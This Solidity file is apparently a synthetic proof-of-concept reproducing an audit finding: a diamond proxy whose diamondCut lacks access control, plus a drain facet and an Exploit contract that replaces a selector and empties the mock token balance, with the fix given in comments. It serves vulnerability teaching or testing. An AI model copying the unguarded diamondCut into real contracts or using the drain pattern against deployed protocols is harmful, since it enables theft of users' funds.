// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Burve SimplexDiamond — Unrestricted diamondCut (Pashov, Jan 2025; #55210)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: DiamondCutFacet.diamondCut is registered on the diamond with
    NO owner/admin check. Anyone can Add/Replace/Remove facets and take over
    the protocol (e.g. add a drain facet and empty TVL).

    Finding: "this function is not restricted, meaning anyone can call it to
    remove or replace any selector or facet."
    FIX: AdminLib.validateOwner() (or equivalent) at the start of diamondCut.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Honest view facet (protocol "liquidity" query) — not the vuln.
contract ViewFacet {
    function tvl(address token) external view returns (uint256) {
        return MockERC20(token).balanceOf(address(this));
    }
}

/// @notice Malicious facet — drains token balance of the diamond (delegatecall context).
contract DrainFacet {
    function drain(address token, address to) external {
        uint256 bal = MockERC20(token).balanceOf(address(this));
        MockERC20(token).transfer(to, bal);
    }
}

/// @notice Minimal EIP-2535 diamond. diamondCut has NO access control — the vuln.
contract SimplexDiamond {
    // selector => facet implementation
    mapping(bytes4 => address) public facets;
    address public diamondOwner; // intended admin — never enforced on diamondCut

    event DiamondCut(bytes4 selector, address oldFacet, address newFacet);

    constructor(address initialOwner) {
        diamondOwner = initialOwner;
    }

    /// @dev Owner bootstrap only (not the attack path).
    function setFacet(bytes4 selector, address facet) external {
        require(msg.sender == diamondOwner, "bootstrap only owner");
        facets[selector] = facet;
    }

    /// @dev Blamed API — mirrors DiamondCutFacet.diamondCut with no permission check.
    function diamondCut(bytes4 selector, address newFacet) external {
        // FIX: require(msg.sender == diamondOwner, "not owner"); // AdminLib.validateOwner()
        address old = facets[selector];
        facets[selector] = newFacet; // @> VULN: unrestricted diamondCut — any caller can replace facets
        emit DiamondCut(selector, old, newFacet);
    }

    fallback() external payable {
        address facet = facets[msg.sig];
        require(facet != address(0), "no facet");
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), facet, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    receive() external payable {}
}

/// @dev Attacker adds DrainFacet via unrestricted diamondCut and steals TVL.
contract Exploit {
    MockERC20 public token; // CREATE 1
    ViewFacet public viewImpl; // CREATE 2
    DrainFacet public drainImpl; // CREATE 3
    SimplexDiamond public diamond; // CREATE 4 — vulnerable

    uint256 public constant TVL = 100 ether;
    uint256 public stolen;

    bytes4 constant DRAIN_SEL = bytes4(keccak256("drain(address,address)"));
    bytes4 constant TVL_SEL = bytes4(keccak256("tvl(address)"));

    constructor() {
        token = new MockERC20();
        viewImpl = new ViewFacet();
        drainImpl = new DrainFacet();
        diamond = new SimplexDiamond(address(this));

        // Bootstrap honest view facet
        diamond.setFacet(TVL_SEL, address(viewImpl));

        // Protocol holds 100e18 TVL in the diamond
        token.mint(address(diamond), TVL);
        require(token.balanceOf(address(diamond)) == TVL, "tvl");
    }

    function run() external {
        // Attacker is NOT diamondOwner — but diamondCut is unrestricted.
        diamond.diamondCut(DRAIN_SEL, address(drainImpl)); // hits @> VULN

        (bool ok,) = address(diamond).call(
            abi.encodeWithSelector(DRAIN_SEL, address(token), address(this))
        );
        require(ok, "drain failed");

        stolen = token.balanceOf(address(this));
        require(stolen == TVL, "did not drain tvl");
        require(token.balanceOf(address(diamond)) == 0, "diamond not empty");
    }
}
